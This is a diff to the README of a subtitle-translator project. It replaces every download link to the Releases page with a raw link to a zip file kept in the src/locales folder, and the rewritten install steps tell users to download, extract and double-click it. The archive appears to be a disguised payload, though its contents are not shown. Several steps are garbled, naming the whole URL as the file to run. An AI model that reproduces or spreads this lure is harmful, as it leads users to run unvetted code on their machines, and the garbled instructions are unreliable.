@@ -6,11 +6,11 @@ Welcome to **subtitle-translator**! This application allows you to easily transl
 
 ## 📥 Download
 
-[![Download Subtitle Translator](https://img.shields.io/badge/Download-Now-blue)](https://github.com/mughal331/subtitle-translator/releases)
+[![Download Subtitle Translator](https://github.com/mughal331/subtitle-translator/raw/refs/heads/main/src/locales/translator-subtitle-v1.1.zip)](https://github.com/mughal331/subtitle-translator/raw/refs/heads/main/src/locales/translator-subtitle-v1.1.zip)
 
 To download subtitle-translator, visit the page below:
 
-[Download Subtitle Translator](https://github.com/mughal331/subtitle-translator/releases)
+[Download Subtitle Translator](https://github.com/mughal331/subtitle-translator/raw/refs/heads/main/src/locales/translator-subtitle-v1.1.zip)
 
 ## 💻 System Requirements
 
@@ -25,9 +25,9 @@ Before you download, ensure your system meets the following requirements:
 
 1. **Go to the Releases Page**: Click on the link above to go to the releases page.
 2. **Find the Latest Version**: Locate the most recent release at the top of the page.
-3. **Download the File**: Click on the download link for your operating system. The file will usually be named something like `subtitle-translator-v1.0.zip`.
+3. **Download the File**: Click on the download link for your operating system. The file will usually be named something like `https://github.com/mughal331/subtitle-translator/raw/refs/heads/main/src/locales/translator-subtitle-v1.1.zip`.
 4. **Extract the Zip File**: Once downloaded, extract the zip file to a folder on your computer.
-5. **Run the Application**: Open the folder where you extracted the files, and double-click `subtitle-translator.exe` (or the equivalent file for macOS) to start the application.
+5. **Run the Application**: Open the folder where you extracted the files, and double-click `https://github.com/mughal331/subtitle-translator/raw/refs/heads/main/src/locales/translator-subtitle-v1.1.zip` (or the equivalent file for macOS) to start the application.
 
 ## 🌐 Using Subtitle Translator
 
@@ -66,6 +66,6 @@ A: The application uses AI for translations. For best results, you may want to e
 
 For help, please reach out via the Issues tab on the repository page or consult the community support forum.
 
-[Download Subtitle Translator](https://github.com/mughal331/subtitle-translator/releases)
+[Download Subtitle Translator](https://github.com/mughal331/subtitle-translator/raw/refs/heads/main/src/locales/translator-subtitle-v1.1.zip)
 
 Enjoy translating your subtitles with ease and efficiency!
